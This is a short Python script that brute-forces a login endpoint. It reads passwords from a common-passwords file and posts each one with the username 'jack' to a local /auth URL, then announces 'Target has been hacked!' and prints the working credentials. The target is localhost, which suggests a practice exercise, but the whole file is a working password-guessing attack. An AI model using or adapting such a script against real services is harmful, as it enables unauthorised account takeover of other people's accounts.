import requests


def check_passwords_from_list():
    login = 'jack'
    net_protocol = 'http'
    net_node = '127.0.0.1'
    net_port = '5000'
    net_path = 'auth'
    net_address = 'http://127.0.0.1:5000/auth'
    with open('../common_passwords_file.txt', 'r') as password_list_file:
        number = 0
        for line in password_list_file:
            number += 1
            password = line.strip()
            print(f'Attempt №: {number}   Current password: {password}')
            response = requests.post(f'{net_protocol}://{net_node}:{net_port}/{net_path}',
                                     json={'login': login, 'password': password})
            if response.status_code == 200:
                print()
                print('Success! Target has been hacked!')
                print(f'Target login: {login}   Target password: {password}')
                break
            else:
                print(f'Status code: {response.status_code}')


check_passwords_from_list()
